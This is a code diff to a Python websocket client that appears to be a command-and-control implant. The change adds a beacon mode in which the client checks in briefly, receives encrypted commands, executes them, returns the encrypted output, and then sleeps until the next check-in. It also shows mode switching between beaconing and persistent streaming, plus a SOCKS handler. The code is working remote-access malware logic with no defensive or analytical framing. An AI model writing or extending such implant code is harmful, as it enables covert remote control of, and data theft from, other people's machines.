@@ -142,6 +142,48 @@ async def connect_to_server():
                     if current_mode == 'streaming':
                         heartbeat_task = asyncio.create_task(heartbeat(websocket))
 
+                    # Beacon mode: check for commands then disconnect
+                    if current_mode == 'beacon':
+                        try:
+                            # Wait briefly for any queued commands
+                            message = await asyncio.wait_for(websocket.recv(), timeout=2.0)
+                            decrypted = simple_decrypt(message)
+                            data = json.loads(decrypted)
+
+                            if data.get('type') == 'command':
+                                command = data.get('command', '')
+                                output = execute_command(command)
+
+                                response = {
+                                    'type': 'response',
+                                    'output': output
+                                }
+                                encrypted_response = simple_encrypt(json.dumps(response))
+                                await websocket.send(encrypted_response)
+
+                            elif data.get('type') == 'set_interval':
+                                beacon_interval = data.get('interval', beacon_interval)
+
+                            elif data.get('type') == 'upgrade_mode':
+                                current_mode = 'streaming'
+                                mode_msg = {
+                                    'type': 'mode_change',
+                                    'mode': 'streaming'
+                                }
+                                encrypted_msg = simple_encrypt(json.dumps(mode_msg))
+                                await websocket.send(encrypted_msg)
+                                # Don't break, switch to streaming mode handling
+
+                        except asyncio.TimeoutError:
+                            # No commands, disconnect and sleep
+                            pass
+
+                        # Disconnect and sleep for beacon interval
+                        if current_mode == 'beacon':
+                            await asyncio.sleep(beacon_interval)
+                            continue
+
+                    # Streaming mode: maintain persistent connection
                     async for message in websocket:
                         try:
                             decrypted = simple_decrypt(message)
@@ -157,9 +199,6 @@ async def connect_to_server():
                                 }
                                 encrypted_response = simple_encrypt(json.dumps(response))
                                 await websocket.send(encrypted_response)
-
-                                if current_mode == 'beacon':
-                                    await asyncio.sleep(beacon_interval)
 
                             elif data.get('type') == 'set_interval':
                                 beacon_interval = data.get('interval', beacon_interval)
@@ -189,6 +228,8 @@ async def connect_to_server():
                                 }
                                 encrypted_msg = simple_encrypt(json.dumps(mode_msg))
                                 await websocket.send(encrypted_msg)
+                                # Break out to beacon mode
+                                break
 
                             elif data.get('type') == 'socks_init':
                                 pass
@@ -220,7 +261,9 @@ async def connect_to_server():
         except Exception as e:
             pass
 
-        await asyncio.sleep(RECONNECT_DELAY)
+        # Reconnect delay for streaming or on error
+        if current_mode == 'streaming':
+            await asyncio.sleep(RECONNECT_DELAY)
 
 
 if __name__ == '__main__':
